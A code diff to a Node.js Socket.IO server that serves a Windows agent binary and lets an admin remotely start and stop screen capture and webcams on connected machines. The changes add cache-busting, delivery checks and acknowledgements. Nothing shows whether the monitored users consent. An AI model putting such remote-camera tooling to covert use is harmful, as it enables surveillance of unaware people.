@@ -174,11 +174,26 @@ const getAgentDownloadBaseUrl = (req) => AGENT_DOWNLOAD_BASE_URL || buildPublicB
 const buildAgentManifest = ({ req, version, sha256, fileName = AGENT_BINARY_NAME, extra = {} }) => {
     const versionValue = sanitizeVersion(version);
     const baseUrl = getAgentDownloadBaseUrl(req).replace(/\/+$/, '');
+    const normalizedSha256 = String(sha256 || '').toLowerCase();
+    const binaryUrl = `${baseUrl}/${encodeURIComponent(fileName)}`;
+    const cacheBustingParams = new URLSearchParams();
+
+    if (versionValue) {
+        cacheBustingParams.set('v', versionValue);
+    }
+
+    if (normalizedSha256) {
+        cacheBustingParams.set('sha256', normalizedSha256.slice(0, 16));
+    }
+
+    const urlWithVersion = cacheBustingParams.toString()
+        ? `${binaryUrl}?${cacheBustingParams.toString()}`
+        : binaryUrl;
 
     return {
         version: versionValue,
-        url: `${baseUrl}/${encodeURIComponent(fileName)}`,
-        sha256: String(sha256 || '').toLowerCase(),
+        url: urlWithVersion,
+        sha256: normalizedSha256,
         releasedAt: new Date().toISOString(),
         ...extra
     };
@@ -427,10 +442,23 @@ app.get('/health', (req, res) => {
 app.use(AGENT_STATIC_ROUTE, express.static(AGENT_UPDATES_DIR, {
     fallthrough: true,
     setHeaders: (res, filePath) => {
-        if (filePath.endsWith('.exe')) {
+        const servedFileName = path.basename(filePath);
+
+        if (servedFileName === AGENT_MANIFEST_NAME) {
+            res.setHeader('Content-Type', 'application/json; charset=utf-8');
+            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+            res.setHeader('Pragma', 'no-cache');
+            res.setHeader('Expires', '0');
+            return;
+        }
+
+        if (servedFileName === AGENT_BINARY_NAME || filePath.endsWith('.exe')) {
             res.setHeader('Content-Type', 'application/octet-stream');
             res.setHeader('Content-Disposition', `attachment; filename="${AGENT_BINARY_NAME}"`);
+            res.setHeader('Cache-Control', 'public, max-age=60, must-revalidate');
+            return;
         }
+
         res.setHeader('Cache-Control', 'public, max-age=300');
     }
 }));
@@ -689,11 +717,50 @@ io.on('connection', (socket) => {
         const targetId = payload?.targetId;
 
         if (targetId) {
+            const targetSocket = io.sockets.sockets.get(targetId);
+            if (!targetSocket || !agents[targetId]) {
+                return {
+                    ok: false,
+                    scope: 'single',
+                    targetId,
+                    sentCount: 0,
+                    reason: 'target-offline'
+                };
+            }
+
             io.to(targetId).emit(eventName, { targetId });
-            return;
+            return {
+                ok: true,
+                scope: 'single',
+                targetId,
+                sentCount: 1
+            };
+        }
+
+        const onlineAgents = Object.keys(agents).filter((agentId) => io.sockets.sockets.has(agentId));
+        if (!onlineAgents.length) {
+            return {
+                ok: false,
+                scope: 'all',
+                sentCount: 0,
+                reason: 'no-agents-online'
+            };
         }
 
         io.to(AGENT_ROOM).emit(eventName, {});
+        return {
+            ok: true,
+            scope: 'all',
+            sentCount: onlineAgents.length
+        };
+    };
+
+    const emitControlAck = (action, result) => {
+        io.to(socket.id).emit('ui_control_ack', {
+            action,
+            ...result,
+            requestedAt: Date.now()
+        });
     };
 
     socket.on('register_node', (data = {}) => {
@@ -719,12 +786,14 @@ io.on('connection', (socket) => {
         }
 
         const previous = agents[socket.id] || { id: socket.id, machine: data.machine || 'Unknown-PC' };
+        const hasRecording = typeof data.recording === 'boolean';
+        const hasCameraOn = typeof data.cameraOn === 'boolean';
 
         agents[socket.id] = {
             ...previous,
             machine: data.machine || previous.machine,
-            recording: Boolean(data.recording),
-            cameraOn: Boolean(data.cameraOn),
+            recording: hasRecording ? data.recording : Boolean(previous.recording),
+            cameraOn: hasCameraOn ? data.cameraOn : Boolean(previous.cameraOn),
             lastStateAt: Date.now()
         };
 
@@ -743,26 +812,30 @@ io.on('connection', (socket) => {
         if (!isAdmin) {
             return;
         }
-        emitControl('start_capture', payload);
+        const result = emitControl('start_capture', payload);
+        emitControlAck('start_capture', result);
     });
     socket.on('admin_stop_capture', (payload) => {
         if (!isAdmin) {
             return;
         }
-        emitControl('stop_capture', payload);
+        const result = emitControl('stop_capture', payload);
+        emitControlAck('stop_capture', result);
     });
 
     socket.on('admin_start_all', () => {
         if (!isAdmin) {
             return;
         }
-        emitControl('start_capture');
+        const result = emitControl('start_capture');
+        emitControlAck('start_capture', result);
     });
     socket.on('admin_stop_all', () => {
         if (!isAdmin) {
             return;
         }
-        emitControl('stop_capture');
+        const result = emitControl('stop_capture');
+        emitControlAck('stop_capture', result);
     });
 
     // Camera Controls
@@ -770,13 +843,15 @@ io.on('connection', (socket) => {
         if (!isAdmin) {
             return;
         }
-        emitControl('start_camera', payload);
+        const result = emitControl('start_camera', payload);
+        emitControlAck('start_camera', result);
     });
     socket.on('admin_stop_camera', (payload) => {
         if (!isAdmin) {
             return;
         }
-        emitControl('stop_camera', payload);
+        const result = emitControl('stop_camera', payload);
+        emitControlAck('stop_camera', result);
     });
 
     // Relay Camera Frames from Agent to Dashboard
